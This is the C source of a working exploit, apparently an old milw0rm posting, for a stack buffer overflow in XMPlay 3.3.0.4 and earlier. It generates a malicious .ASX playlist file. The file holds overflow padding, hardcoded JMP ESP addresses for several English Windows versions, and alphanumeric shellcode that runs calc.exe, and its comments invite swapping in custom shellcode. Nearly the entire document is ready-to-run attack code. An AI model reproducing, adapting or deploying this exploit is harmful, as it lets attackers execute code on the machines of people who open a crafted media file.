/*
===================================================================
	0-day XMPlay 3.3.0.4 .ASX Filename Buffer Overflow Exploit
===================================================================
XMPlay 3.3.0.4 and lower experiance a stack-based buffer overflow when
loading malformed .ASX files

This merely executes CALC.exe but you could always add your own custom
shellcode (alpha2)

===============
ASX
<ASX VERSION="3">
<ENTRY>
    <REF HREF="file://[EXPLOIT HERE]"
</ENTRY>
</ASX>
===============


Reported Exploit Date: 11/21/2006

*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
int main(int argc, char *argv[])
{

	FILE *Exploit;
	char buffer[512];

	/* Executes Calc.exe Alpha2 Shellcode Provided by Expanders <expanders[at]gmail[dot]com> */
	unsigned char scode[] =
	"TYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI"
	"YlHhQTs0s0c0LKcuwLLK1ls52Xs1JONkRofxNkcoUpUQZKCylK4tLKuQxnTqo0LYnLMTkpptUWiQ9ZdM"
	"5QO2JKZT5k2tUtUTPuKULKQOfDc1zKPfNkflrkNkSowlvaZKLK5LlKgqxkMYqL14wtYSFQkpcTNkQPtp"
	"LEiPd8VlNkqPVllKPp7lNMLK0htHjKuYnkMPnP7pc05PLKsXUlsovQxvU0PVOy9hlCo0SKRpsXhoxNip"
	"sPu8LX9nMZvnv79oM7sSU1rLsSdnu5rX3UuPA";



	char NOPSled[50];
	char tail[] = ".mid\x22\r\n";
	int JMP, x;

	printf("\n======================================================================\n");
	printf("XMPlay 3.3.0.4 and prior ASX Filename Buffer Overflow Exploit\n");
	printf("Discovered and Coded By: Greg Linares <GLinares.code[at]gmail[dot]com>\n");
	printf("Usage: %s <output ASX file> <JMP>\n", argv[0]);
	printf("\n JMP Options\n");
	printf("1 = English Windows XP SP 2 User32.dll <JMP ESP 0x77db41bc>\n");
	printf("2 = English Windows XP SP 1 User32.dll <JMP ESP 0x77d718fc>\n");
	printf("3 = English Windows 2003 SP0 and SP1 User32.dll <JMP ESP 0x77d74adc>\n");
	printf("4 = English Windows 2000 SP 4 User32.dll  <JMP ESP 0x77e3c256>\n");
	printf("====================================================================\n\n\n");


	if (argc < 2) {
		printf("Invalid Number Of Arguments\n");
		return 1;
	}


	Exploit = fopen(argv[1],"w");
    if ( !Exploit )
    {
        printf("\nCouldn't Open File!");
        return 1;
    }

	memset(buffer, 0, 505);
	memset(NOPSled, 0, 20);


	fputs("<ASX VERSION=\x22\x33\x22>\r\n<ENTRY>\r\n", Exploit);
	fputs("<REF HREF=\x22", Exploit);
	fputs("file://C:\\", Exploit);

	for (x=0;x<498;x++) {
		strcat(buffer, "A");
	}

	fputs(buffer, Exploit);
	if (atoi(argv[2]) <= 0) {
		JMP = 1;
	} else if (atoi(argv[2]) > 4) {
		JMP = 1;
	} else {
		JMP = atoi(argv[2]);
	}
	switch(JMP) {
		case 1:
			printf("Using English Windows XP SP2 JMP...\n");
			fputs("\xbc\x41\xdb\x77", Exploit);
			break;
		case 2:
			printf("Using English Windows XP SP1 JMP...\n");
			fputs("\xfc\x18\xd7\x77", Exploit);
			break;
		case 3:
			printf("Using English Windows 2003 SP0 & SP1 JMP...\n");
			fputs("\xdc\x4a\xd7\x77", Exploit);
			break;
		case 4:
			printf("Using English Windows 2000 SP 4 JMP...\n");
			fputs("\x56\xc2\xe3\x77", Exploit);
			break;
	}

	fputs(scode, Exploit);

	for (x=0;x<20;x++) {
		strcat(NOPSled, "\x90");
	}

	fputs(NOPSled, Exploit);
	fputs(tail, Exploit);
	fputs("</ENTRY>\r\n</ASX>\r\n", Exploit);



	printf("Exploit Succeeded...\n Output File: %s\n\n", argv[1]);


	printf("Exploit Coded by Greg Linares (GLinares.code[at]gmail[dot]com)\n");
	printf("Greetz to: Jerome Athias and Expanders - Thanks For The Ideas, Tools and Alpha2 Shell Code\n");

	fclose(Exploit);
	return 0;
}

// milw0rm.com [2006-11-21]
